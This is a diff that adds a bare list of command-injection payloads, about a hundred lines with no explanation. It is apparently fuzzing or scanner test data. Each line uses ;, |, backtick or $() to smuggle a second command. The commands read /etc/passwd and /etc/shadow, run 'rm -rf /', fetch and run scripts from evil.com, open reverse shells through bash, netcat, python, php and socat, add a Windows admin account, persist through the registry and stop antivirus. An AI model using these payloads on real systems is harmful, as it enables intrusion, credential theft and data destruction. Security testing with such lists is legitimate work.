@@ -1,0 +1,100 @@
+; cat /etc/passwd
+| cat /etc/shadow
+`cat /etc/hostname`
+$(cat /etc/passwd)
+; rm -rf /
+| curl http://evil.com/shell.sh | sh
+`wget http://evil.com/backdoor`
+$(bash -i >& /dev/tcp/evil.com/4444 0>&1)
+; nc -e /bin/sh evil.com 4444
+| python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("evil.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+; ls -la
+| whoami
+`id`
+$(uname -a)
+; id
+| cat /etc/passwd
+`cat /etc/issue`
+$(hostname)
+; wget http://evil.com/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor
+| python -c 'import pty;pty.spawn("/bin/bash")'
+`curl http://evil.com/shell.sh | bash`
+$(perl -e 'system("id")')
+; echo "hacked" > /tmp/pwned
+| telnet evil.com 4444
+`ncat evil.com 4444 -e /bin/bash`
+$(php -r 'system("id");')
+; ruby -e 'exec "id"'
+| python -c 'print("pwned")'
+`php -r "system('cat /etc/passwd');"`
+$(ruby -e 'system("cat /etc/shadow")')
+; lua -e 'os.execute("id")'
+| node -e 'require("child_process").execSync("id")'
+`perl -e 'system("cat /etc/passwd")'`
+$(java -version 2>&1)
+; tftp evil.com GET shell.sh
+| ftp evil.com
+`script -qc "bash -i" >& /dev/tcp/evil.com/4444 0>&1`
+$(python -c 'import base64;print(base64.b64encode(open("/etc/passwd").read()))')
+; openssl s_client -connect evil.com:4444
+| socat TCP:evil.com:4444 EXEC:/bin/sh
+$(/bin/sh -i)
+; /bin/bash -c 'exec bash -i >& /dev/tcp/evil.com/4444 0>&1'
+| bash -c 'exec bash -i >& /dev/tcp/evil.com/4444 0>&1'
+`bash -c 'exec bash -i >& /dev/tcp/evil.com/4444 0>&1'`
+$(bash -c 'exec bash -i >& /dev/tcp/evil.com/4444 0>&1')
+; php -r '$sock=fsockopen("evil.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+| python -c 'import socket,subprocess;s=socket.socket();s.connect(("evil.com",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+; echo pwned
+| dir
+`type C:\windows\win.ini`
+$(Get-ChildItem)
+; cmd /c dir c:\
+| powershell -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evil.com/ps.ps1')"
+`mshta http://evil.com/payload.hta`
+$(reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "backdoor.exe")
+; certutil -urlcache -f http://evil.com/shell.exe shell.exe
+| wscript script.vbs
+`cscript evil.vbs`
+$(rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://evil.com/evil.sct"))
+; taskkill /F /IM av.exe
+| net user hacker P@ssw0rd /add
+`net localgroup Administrators hacker /add`
+$(sc stop MpsSvc)
+; for /f "tokens=*" %i in ('type C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*') do @echo %i
+| %windir%\system32\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";String.fromCharCode(97,108,101,114,116,40,49,41)
+`%windir%\system32\mshta.exe javascript:alert(1)`
+$(pwd && ls -la)
+; echo $HOME
+| printenv
+`env`
+$(export PATH=/tmp:$PATH && malicious-command)
+; alias ls='malicious_command'
+| eval `echo 'aGVsbG8=' | base64 -d`
+`eval $(echo 'aWQ=' | base64 -d)`
+; system("id")
+| shell_exec('whoami')
+`exec('cat /etc/passwd')`
+$(popen('id', 'r'))
+; passthru('ls -la')
+| `ls -la`
+$(shell_exec('id'))
+; exec('whoami')
+| proc_open('id', $pipes, 'r')
+`pcntl_exec('/bin/cat', ['/etc/passwd'])`
+$(Runtime.getRuntime().exec("id"))
+; ProcessBuilder.start()
+| new ProcessBuilder("id").start()
+`Runtime.getRuntime().exec("cat /etc/passwd")`
+$(System.Diagnostics.Process.Start("cmd.exe", "/c whoami"))
+; os.system('id')
+| subprocess.call(['id'], shell=True)
+`os.popen('cat /etc/passwd').read()`
+$(commands.getoutput('id'))
+; eval("system('id')")
+| exec("whoami")
+`system('cat /etc/passwd')`
+$(os.execute('id'))
+; io.popen('id')
+| ngx.exec('/bin/sh')
+`loadstring(os.popen('id'):read())()`
